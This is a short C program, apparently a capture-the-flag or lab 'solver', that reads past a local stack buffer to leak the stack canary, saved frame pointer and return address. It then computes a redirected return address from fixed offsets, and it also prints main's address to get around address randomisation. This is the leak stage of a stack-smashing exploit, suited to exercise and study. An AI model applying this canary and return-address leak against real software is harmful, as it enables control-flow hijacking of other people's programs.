#include <stdio.h>
#include <string.h>
#include <stdint.h>

typedef int (*printf_ptr_t)(const char *format, ...);

void solver(printf_ptr_t fptr) {
	char msg[16] = "2";
	uint64_t *canary = msg+0x20-0x8;
	uint64_t *rbp = msg+0x20;
	uint64_t *returnAddr = msg+0x28;
	// uint64_t *magic = rbp-0x64;

	fptr("%16s: %lx\n", "canary", *canary); 
	fptr("%16s: %lx\n", "rbp", *rbp); 
	fptr("%16s: %lx\n", "returnAddr", *returnAddr); 
	fptr("%16s: %lx\n", "mod_returnAddr", *returnAddr+(0xa3aa - 0xa2ff)); // 0xa3ff - 0xa2aa
	// fptr("%s\n", msg);
}

int main() {
	char fmt[16] = "** main = %p\n";
	printf(fmt, main);
	solver(printf);
	return 0;
}